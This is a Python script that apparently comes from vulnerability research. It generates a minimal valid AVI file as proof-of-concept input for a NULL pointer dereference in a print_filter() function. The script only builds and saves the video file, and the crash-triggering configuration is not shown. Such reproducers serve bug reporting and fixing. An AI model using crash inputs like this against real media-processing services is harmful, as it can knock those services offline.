#!/usr/bin/env python3
"""
PoC generator for VULN 001 - NULL Pointer Dereference in print_filter()
via unlinked filter pad (CWE-476).

Creates a minimal valid AVI file with a single video stream (raw BGR24).
"""
import struct
import os

def make_chunk(tag, data):
    """Build a RIFF chunk: tag(4) + size(4LE) + data"""
    assert len(tag) == 4
    return tag.encode('ascii') + struct.pack('<I', len(data)) + data

def make_list(list_type, data):
    """Build a RIFF LIST: LIST(4) + size(4LE) + listtype(4) + data"""
    assert len(list_type) == 4
    content = list_type.encode('ascii') + data
    return b'LIST' + struct.pack('<I', len(content)) + content

# Video parameters: small 16x16, 1 frame, 1 fps, raw BGR24
WIDTH   = 16
HEIGHT  = 16
FPS_NUM = 1
FPS_DEN = 1   # rate/scale == fps  ->  1/1 == 1 fps
TOTAL   = 1   # total frames
FRAME   = WIDTH * HEIGHT * 3   # BGR24 bytes per frame

# -----------------------------------------------------------------------
# avih  (AVIMAINHEADER, 56 bytes = 14 x DWORD)
# -----------------------------------------------------------------------
avih_data = struct.pack('<14I',
    1_000_000 // FPS_NUM * FPS_DEN,  # dwMicroSecPerFrame
    FRAME,                            # dwMaxBytesPerSec
    0,                                # dwPaddingGranularity
    0x10,                             # dwFlags = AVIF_HASINDEX
    TOTAL,                            # dwTotalFrames
    0,                                # dwInitialFrames
    1,                                # dwStreams
    FRAME,                            # dwSuggestedBufferSize
    WIDTH,                            # dwWidth
    HEIGHT,                           # dwHeight
    0, 0, 0, 0,                       # dwReserved[4]
)
assert len(avih_data) == 56

# -----------------------------------------------------------------------
# strh  (AVISTREAMHEADER, 56 bytes)
# -----------------------------------------------------------------------
# Fields: fccType(4s), fccHandler(4s), dwFlags(I), wPriority(H),
#         wLanguage(H), dwInitialFrames(I), dwScale(I), dwRate(I),
#         dwStart(I), dwLength(I), dwSuggestedBufferSize(I),
#         dwQuality(I), dwSampleSize(I)   [48 bytes so far]
#         + rcFrame { left(h), top(h), right(h), bottom(h) }  [8 bytes]
strh_main = struct.pack('<4s4sIHHIIIIIIII',
    b'vids',     # fccType
    b'DIB ',     # fccHandler – raw (uncompressed) video
    0,           # dwFlags
    0,           # wPriority
    0,           # wLanguage
    0,           # dwInitialFrames
    FPS_DEN,     # dwScale
    FPS_NUM,     # dwRate
    0,           # dwStart
    TOTAL,       # dwLength
    FRAME,       # dwSuggestedBufferSize
    0xFFFFFFFF,  # dwQuality
    0,           # dwSampleSize
)
strh_rc = struct.pack('<hhhh', 0, 0, WIDTH, HEIGHT)
strh_data = strh_main + strh_rc
assert len(strh_data) == 56

# -----------------------------------------------------------------------
# strf  (BITMAPINFOHEADER, 40 bytes)
# -----------------------------------------------------------------------
strf_data = struct.pack('<IiiHHIIiiII',
    40,      # biSize
    WIDTH,   # biWidth
    HEIGHT,  # biHeight  (positive = bottom-up DIB)
    1,       # biPlanes
    24,      # biBitCount (BGR24)
    0,       # biCompression = BI_RGB
    FRAME,   # biSizeImage
    0,       # biXPelsPerMeter
    0,       # biYPelsPerMeter
    0,       # biClrUsed
    0,       # biClrImportant
)
assert len(strf_data) == 40

# -----------------------------------------------------------------------
# Assemble hdrl LIST
# -----------------------------------------------------------------------
strl_content = make_chunk('strh', strh_data) + make_chunk('strf', strf_data)
strl_list    = make_list('strl', strl_content)
hdrl_content = make_chunk('avih', avih_data) + strl_list
hdrl_list    = make_list('hdrl', hdrl_content)

# -----------------------------------------------------------------------
# movi LIST  (one black frame)
# -----------------------------------------------------------------------
frame_data   = bytes(FRAME)   # all-zero = black
movi_content = make_chunk('00dc', frame_data)
movi_list    = make_list('movi', movi_content)

# -----------------------------------------------------------------------
# idx1  (old-style AVI index, one entry)
# dwChunkOffset = offset from 'movi' FOURCC to the '00dc' chunk start
#   movi FOURCC is 8 bytes into the movi LIST (after 'LIST' + size field)
#   '00dc' chunk starts 4 bytes after the 'movi' FOURCC
# -----------------------------------------------------------------------
IDX1_OFFSET = 4    # '00dc' is immediately after 'movi' FOURCC (4 bytes)
idx1_data = struct.pack('<4sIII',
    b'00dc',   # ckid
    0x10,      # dwFlags = AVIIF_KEYFRAME
    IDX1_OFFSET,
    FRAME,     # dwChunkLength
)
idx1_chunk = make_chunk('idx1', idx1_data)

# -----------------------------------------------------------------------
# Final RIFF AVI
# -----------------------------------------------------------------------
riff_content = b'AVI ' + hdrl_list + movi_list + idx1_chunk
riff = b'RIFF' + struct.pack('<I', len(riff_content)) + riff_content

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        'vuln_001_input.avi')
with open(out_path, 'wb') as fh:
    fh.write(riff)

print(f"[+] Written {len(riff)} bytes -> {out_path}")
